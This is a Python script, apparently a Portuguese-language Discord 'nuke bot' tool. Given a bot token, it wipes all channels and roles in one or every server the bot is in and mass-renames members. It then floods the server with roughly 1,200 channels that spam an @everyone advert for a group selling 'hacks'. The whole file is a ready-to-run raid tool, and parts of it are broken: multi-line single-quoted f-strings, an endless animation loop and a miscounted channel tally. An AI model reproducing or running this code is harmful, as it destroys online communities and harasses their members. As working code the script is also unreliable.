import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import time
import itertools
import asyncio

# Inicialização do Colorama
init()

# Cores do Colorama
dr = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

# Função para limpar o terminal
clear = lambda: system('cls') if os_name == 'nt' else system('clear')

# Função personalizada para entrada
def _input(text):
    print(text, end='')
    return input()

# Função para animação RGB no título
def rgb_animation(text, delay=0.1):
    colors = [R, g, b, m, c, y]
    for color in itertools.cycle(colors):
        print(f'\r{color}{text}', end='')
        time.sleep(delay)

# Banner decorado
banner = f'''
{R}██████╗     ██╗  ██╗
{R}██╔══██╗    ██║ ██╔╝
{R}██║  ██║    █████╔╝ 
{R}██║  ██║    ██╔═██╗ 
{R}██████╔╝    ██║  ██╗
{R}╚═════╝     ╚═╝  ╚═╝
{Y}Feito por: {G}Menor dk 🇾🇪
'''

# Função para exibir informações dos servidores
async def display_guild_info(guild):
    print(f'\n{R}Servidor: {m}{guild.name}')
    print(f'{C}ID: {G}{guild.id}')
    print(f'{B}Membros: {G}{len(guild.members)}')
    print(f'{Y}Canais: {G}{len(guild.channels)}')
    print(f'{m}Roles: {G}{len(guild.roles)}')
    perms = guild.me.guild_permissions
    print(f'{W}Permissões:')
    print(f'  {C}KICK_MEMBERS: {G}{perms.kick_members}')
    print(f'  {C}BAN_MEMBERS: {G}{perms.ban_members}')
    print(f'  {C}MANAGE_CHANNELS: {G}{perms.manage_channels}')
    print(f'  {C}MANAGE_ROLES: {G}{perms.manage_roles}')
    print(f'  {C}ADMINISTRATOR: {G}{perms.administrator}')

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def rename_all_members(guild, name):
    renamed = 0
    for member in guild.members:
        if not member.guild_permissions.administrator:
            try:
                await member.edit(nick=f'{name} ({member.name})')
                renamed += 1
            except:
                continue
    return renamed

async def create_text_channels(guild, name, message):
    created = 0
    for _ in range(10):  # Cria 10 canais por vez
        try:
            channel = await guild.create_text_channel(name=name)
            await channel.send(message)  # Envia mensagem no canal criado
            created += 5
        except:
            continue
    return created

async def nuke_guild(guild, name, message):
    print(f'{R}Nuke: {m}{guild.name}')
    
    # Renomeia membros
    renamed = await rename_all_members(guild, name)
    print(f'{m}Renomeados: {B}{renamed}')
    
    # Deleta canais
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Canais deletados: {B}{deleted_channels}')
    
    # Deleta roles
    deleted_roles = await delete_all_roles(guild)
    print(f'{m}Roles deletados: {B}{deleted_roles}')
    
    # Cria canais de texto
    created_channels = 0
    while created_channels < 1199:
        created = await create_text_channels(guild, name, message)
        created_channels += created
        print(f'{m}Canais criados: {B}{created_channels}')
        time.sleep(0.555)  # Atraso para evitar problemas
    
    print(f'{R}--------------------------------------------\n\n')

async def main():
    while True:
        clear()
        rgb_animation(f'{banner}                
{C}--------------------------------------------
{B}[Menu]
    {Y}└─[1] {m}- {G}Executar Setup Nuke Bot
    {Y}└─[2] {m}- {G}Sair
    {Y}└─[3] {m}- {G}Parar
    {Y}└─[4] {m}- {G}Ver Servidores do Bot
{Y}====>{G}', delay=0.1)
        
        choice = _input('Escolha uma opção: ')
        
        if choice == '1':
            token = _input(f'{Y}Insira o token do bot:{G}')
            name = _input(f'{Y}Insira o nome para os canal/nomes ')
            message = '''# DKZIN 🔥🥋🇾🇪
> - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
- https://discord.com/invite/gZSx3n8Csa

> TEMOS OTIMOS HACKS E METHODOS 
> BOTS DE KEY E MUITO MAIS

@here @everyone'''
            
            clear()
            choice_type = _input(f'''
{banner}                
{C}--------------------------------------------
{B}[Selecione]
    {Y}└─[1] {m}- {G}Nuke de todos os servidores.
    {Y}└─[2] {m}- {G}Nuke apenas um servidor.
    {Y}└─[3] {m}- {G}Sair
{Y}====>{G}''')
            
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            if choice_type == '1':
                @client.event
                async def on_ready():
                    print(f'[+] Logado como {client.user.name}')
                    print(f'[+] Bot em {len(client.guilds)} servidores!')
                    for guild in client.guilds:
                        await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '2':
                guild_id = _input(f'{Y}Insira o id do servidor:{G}')
                @client.event
                async def on_ready():
                    for guild in client.guilds:
                        if str(guild.id) == guild_id:
                            await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '3':
                print(f'{dr}Saindo...')
                exit()
            
            try:
                await client.start(token)
                _input('Nuke concluído, pressione Enter para voltar ao menu...')
                clear()
            except Exception as error:
                if 'Privileged Intents' in str(error):
                    _input(f'{R}Erro de Intents\n{G}Para corrigir -> https://prnt.sc/wmrwut\n{B}Pressione Enter para voltar...')
                else:
                    _input(f'{R}{error}\n{B}Pressione Enter para voltar...')
        
        elif choice == '2':
            print(f'{dr}Saindo...')
            exit()
        
        elif choice == '3':
            clear()
            print(f'{dr}Bot Parado...')
            input('Pressione Enter para voltar ao menu...')
            clear()
        
        elif choice == '4':
            token = _input(f'{Y}Insira o token do bot:{G}')
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            @client.event
            async def on_ready():
                clear()
                print(f'{banner}                
{C}--------------------------------------------
{B}[Servidores do Bot]')
                for guild in client.guilds:
                    await display_guild_info(guild)
                    print(f'{C}--------------------------------------------')
                await client.close()
            
            try:
                await client.start(token)
                _input('Pressione Enter para voltar ao menu...')
                clear()
            except Exception as error:
                _input(f'{R}{error}\n{B}Pressione Enter para voltar...')
        
        else:
            print(f'{R}Opção inválida. Pressione Enter para continuar...')

if __name__ == "__main__":
    asyncio.run(main())
